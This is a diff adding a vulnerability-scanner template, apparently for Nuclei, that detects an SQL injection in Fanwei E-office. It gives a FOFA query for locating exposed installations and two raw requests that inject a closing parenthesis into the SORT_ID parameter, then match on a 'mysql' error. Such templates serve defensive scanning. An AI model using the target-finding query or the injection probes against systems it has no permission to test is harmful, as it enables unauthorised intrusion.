@@ -1,0 +1,30 @@
+id: fanwei-e-office-filelist-sqli
+
+info:
+  name: Fanwei E-office Filelist.php Sqli
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hglxt5
+  tags: fanwei-e-office,sqli
+  metadata:
+    fofa-query: 'body="/general/login/index.php" || body="/general/login/view/css/login.css" || header="/general/login/index.php"'
+
+requests:
+  - raw:
+      - |
+        GET /general/file_folder/file_new/filelist.php?FILE_SORT=&SORT_ID=1)&cur_page=&func_id= HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /module/doc_select/docSelectIndex.php?FILE_SORT=1&SORT_ID=1)&cur_page=&defaultInputID=&func_id=8&mode=multi HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "mysql"
+
+      - type: status
+        status:
+          - 302
